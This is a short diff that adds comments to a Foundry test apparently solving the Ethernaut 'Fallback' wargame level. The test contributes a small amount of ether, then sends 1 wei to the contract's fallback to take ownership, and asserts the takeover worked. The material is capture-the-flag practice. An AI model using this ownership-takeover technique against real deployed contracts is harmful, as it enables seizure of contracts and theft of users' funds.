@@ -27,14 +27,19 @@ contract FallbackTest is DSTest {
     }
 
     function testFallback() public {
-        // owner should be the contract deployer
+        // owner should be the contract deployer.
         assertEq(fallbackContract.owner(), address(this));
 
+        // set user as message sender.
         vm.startPrank(user);
+
+        // contribute some eth.
         fallbackContract.contribute{value: 0.0001 ether}();
 
+        // check the contribution.
         assertEq(fallbackContract.contributions(user), 0.0001 ether);
 
+        // send some eth to the contract to claim ownership because you have contributed.
         payable(address(fallbackContract)).call{value: 1 wei}("");
 
         assertEq(fallbackContract.owner(), user);
